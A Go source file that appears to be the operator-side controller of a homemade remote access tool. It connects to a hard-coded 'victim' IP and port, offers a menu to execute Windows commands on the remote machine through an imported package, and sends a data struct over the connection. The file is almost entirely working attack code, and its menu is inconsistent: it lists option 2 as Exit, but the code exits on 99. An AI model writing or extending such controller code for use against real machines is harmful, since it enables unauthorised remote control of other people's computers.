package main

import (
	"GoHacking/hackerserver/core/executecommandwin"
	"GoHacking/hackerserver/core/handleconnection"
	"bufio"
	"encoding/gob"
	"fmt"
	"log"
	"os"
	"strings"
	"time"
)

// Data is teh connection data
type Data struct {
	Name string
	ID   int
	Age  float32
}

func options() {
	fmt.Println("[1] ExecuteCommands")
	fmt.Println("")
	fmt.Println("[2] Exit")
}

// DisplayError prints an erroDisplayError
func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	IP := "192.168.221.133"
	Port := "9090"
	fmt.Println(IP)
	connection, err := handleconnection.ConnecttoVictim(IP, Port)

	if err != nil {
		log.Fatal(err)
	}

	defer connection.Close()
	fmt.Println("[+] Connection established", connection.RemoteAddr().String())

	data := &Data{
		Name: "Jayne Jacobs\nJim Padilla",
		ID:   50,
		Age:  40.43,
	}
	reader := bufio.NewReader(os.Stdin)

	loopControl := true

	for loopControl {
		options()
		fmt.Printf("[+] Enter Options")
		userinputraw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}
		connection.Write([]byte(userinputraw))
		userinput := strings.Trim(userinputraw, "\n")

		switch userinput {
		case "1":
			fmt.Println("[+] Command Execution program")
			err := executecommandwin.CommandWindows(connection)
			if err != nil {
				DisplayError(err)
			}
		case "99":
			fmt.Println("[+] Exiting")
			loopControl = false
		default:
			fmt.Println("[-] Invalid option, try again!")
		}

	}
	encoder := gob.NewEncoder(connection)

	err = encoder.Encode(data)

	if err != nil {
		log.Fatal(err)
	}
	time.Sleep(5 * time.Second)
	fmt.Println("data sent successfully")
}
